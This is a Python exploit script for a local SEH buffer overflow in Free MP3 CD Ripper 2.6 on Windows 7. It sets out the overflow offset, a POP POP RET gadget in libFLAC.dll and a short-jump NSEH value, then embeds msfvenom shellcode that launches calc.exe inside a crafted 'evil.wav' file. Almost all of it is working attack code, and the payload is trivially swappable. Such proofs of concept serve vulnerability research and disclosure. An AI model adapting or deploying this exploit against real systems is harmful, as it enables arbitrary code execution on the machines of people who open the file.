#!/usr/bin/python

#------------------------------------------------------------#
# Exploit - Free MP3 CD Ripper 2.6 local SEH buffer overflow #
#                                                            #
# POP POP RET - 0x100145C1 - libFLAC.dll                     #
# SEH - 0x100145C1                                           #
# NSEH - "\xEB\x06\x90\x90" - short JMP 6 forward            #
# BAD CHARS - '\x00\xff\x0a\x0d'                             #
# PAYLOAD - pop calc.exe                                     #
#-------------------------------------------------------------
#   Author : x00pwn                                          #
#   Date: 9/26/2019                                          #
#   Victim system: Windows 7 pro                             #
#   Protections - DEP/no ASLR/no SAFESEH/no                  #
#------------------------------------------------------------#

from struct import pack

# SEH handler overwritten with cyclic - 46326846
# Log data, item 14
# Address=0BADF00D
# Message=    SEH record (nseh field) at 0x049cfebc overwritten with normal pattern : 0x46326846 (offset 4116), followed by 316 bytes of cyclic data after the handler

seh_handler = pack('I', 0x100145C1) # POP POP RET
# Log data, item 22
# Address=100145C1
# Message=  0x100145c1 : pop esi # pop ecx # ret  |  {PAGE_EXECUTE_READ} [libFLAC.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Program Files (x86)\Free MP3 CD Ripper\libFLAC.dll)
nseh_handler = "\xEB\x06\x90\x90" # JMP forward 6 

# bad chars - '\x00\xff\x0a\x0d'

# msfvenom -p windows/exec CMD=calc.exe -b '\x00\xff\x0a\x0d' EXITFUNC=seh -f python -v shellcode
shellcode =  ""
shellcode += "\xda\xcd\xba\x95\x90\x6b\x4b\xd9\x74\x24\xf4\x5f"
shellcode += "\x31\xc9\xb1\x31\x83\xc7\x04\x31\x57\x14\x03\x57"
shellcode += "\x81\x72\x9e\xb7\x41\xf0\x61\x48\x91\x95\xe8\xad"
shellcode += "\xa0\x95\x8f\xa6\x92\x25\xdb\xeb\x1e\xcd\x89\x1f"
shellcode += "\x95\xa3\x05\x2f\x1e\x09\x70\x1e\x9f\x22\x40\x01"
shellcode += "\x23\x39\x95\xe1\x1a\xf2\xe8\xe0\x5b\xef\x01\xb0"
shellcode += "\x34\x7b\xb7\x25\x31\x31\x04\xcd\x09\xd7\x0c\x32"
shellcode += "\xd9\xd6\x3d\xe5\x52\x81\x9d\x07\xb7\xb9\x97\x1f"
shellcode += "\xd4\x84\x6e\xab\x2e\x72\x71\x7d\x7f\x7b\xde\x40"
shellcode += "\xb0\x8e\x1e\x84\x76\x71\x55\xfc\x85\x0c\x6e\x3b"
shellcode += "\xf4\xca\xfb\xd8\x5e\x98\x5c\x05\x5f\x4d\x3a\xce"
shellcode += "\x53\x3a\x48\x88\x77\xbd\x9d\xa2\x83\x36\x20\x65"
shellcode += "\x02\x0c\x07\xa1\x4f\xd6\x26\xf0\x35\xb9\x57\xe2"
shellcode += "\x96\x66\xf2\x68\x3a\x72\x8f\x32\x50\x85\x1d\x49"
shellcode += "\x16\x85\x1d\x52\x06\xee\x2c\xd9\xc9\x69\xb1\x08"
shellcode += "\xae\x88\x40\x81\x3a\x1c\xfb\x70\x07\x40\xfc\xae"
shellcode += "\x4b\x7d\x7f\x5b\x33\x7a\x9f\x2e\x36\xc6\x27\xc2"
shellcode += "\x4a\x57\xc2\xe4\xf9\x58\xc7\x86\x9c\xca\x8b\x66"
shellcode += "\x3b\x6b\x29\x77"

payload  = "A" * 4116
payload += nseh_handler
payload += seh_handler
payload += "\x90" * 16
payload += shellcode
payload += "D" * (4000 - len(payload))

try:
    exploitCreate = open("evil.wav", "w")
    print("[x] Malicious file created")
    exploitCreate.write(payload)
    print("[x] Payload added to the file")
    exploitCreate.close()
    print("[x] Import evil.wav and pop a calc")
except:
    print("[!] Error creating malicious .wav file")
